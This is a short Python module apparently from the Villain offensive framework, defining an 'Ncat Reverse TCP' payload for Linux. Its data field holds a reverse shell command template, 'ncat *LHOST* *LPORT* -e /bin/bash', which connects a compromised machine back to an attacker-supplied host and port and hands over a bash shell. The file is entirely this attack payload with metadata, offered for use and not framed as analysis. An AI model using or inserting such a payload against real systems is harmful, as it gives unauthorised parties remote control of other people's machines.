# This module is part of the Villain framework

class Payload:

    info = {
        'Title' : 'Ncat Reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Ncat Reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta = {
        'handler' : 'ncat',
        'type' : 'ncat',
        'os' : 'linux'  
    }

    config = {}

    parameters = {
        'lhost' : None
    }

    attrs = {}

    data = "ncat *LHOST* *LPORT* -e /bin/bash"
